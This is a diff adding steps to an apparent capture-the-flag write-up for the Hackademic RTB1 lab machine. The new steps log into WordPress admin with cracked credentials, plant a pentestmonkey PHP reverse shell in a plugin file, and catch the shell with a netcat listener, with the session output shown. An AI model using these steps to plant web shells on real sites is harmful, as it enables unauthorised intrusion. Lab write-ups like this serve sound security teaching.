@@ -193,9 +193,35 @@ Table: wp_users
 
 as we see here sqlmap has cracked some of the hashes and according to `user_level` user `GeorgeMiller` has the highest level of `10`
 
-we use this user to login to `/wp-admin`
+we use this user with credentials `GeorgeMiller:q1w2e3` to login to `/wp-admin` directory.
 
 
+img:adminpage
+
+
+## 3.Gaining Shell 
+
+After checking various parts of the CMS i found that in `Manage` menu and in `Files` submenu we can edit a `hello.php` file.
+
+i just paste a php reverse shell (pentestmonkey) payload and updated the file.
+
+run a listener on you kali machine and navigate to `wp-content/plugins/hello.php`
+
+```bash
+root@kali: nv -nvlp 4444
+          
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.140] 35822
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+ 07:05:40 up  2:12,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=489(apache) groups=489(apache)
+sh: no job control in this shell
+sh-4.0$ id
+id
+uid=48(apache) gid=489(apache) groups=489(apache)
+sh-4.0$
+```
 
 
 
